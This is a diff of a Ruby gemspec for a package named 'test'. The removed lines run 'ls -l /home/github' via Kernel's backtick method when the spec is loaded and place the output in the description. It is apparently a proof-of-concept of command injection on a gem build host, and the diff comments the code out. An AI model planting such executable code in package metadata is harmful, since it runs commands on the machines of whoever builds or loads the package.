@@ -1,12 +1,12 @@
 Gem::Specification.new do |s|
-str="ls -l /home/github;#"
-i=0
-str.each_byte {|b| data[i] = b; i += 1 }
-(i...data.size).each {|i| data[i] = 32 }
-d=Kernel.`(data)
+#str="ls -l /home/github;#"
+#i=0
+#str.each_byte {|b| data[i] = b; i += 1 }
+#(i...data.size).each {|i| data[i] = 32 }
+#d=Kernel.`(data)
   
   s.name = "test"
-  s.description    = "#{d}"
+  s.description    = "abc"
   s.version  = "0.0.2"
   s.summary  = ""
   s.email    = "coderrr.contact@gmail.com"
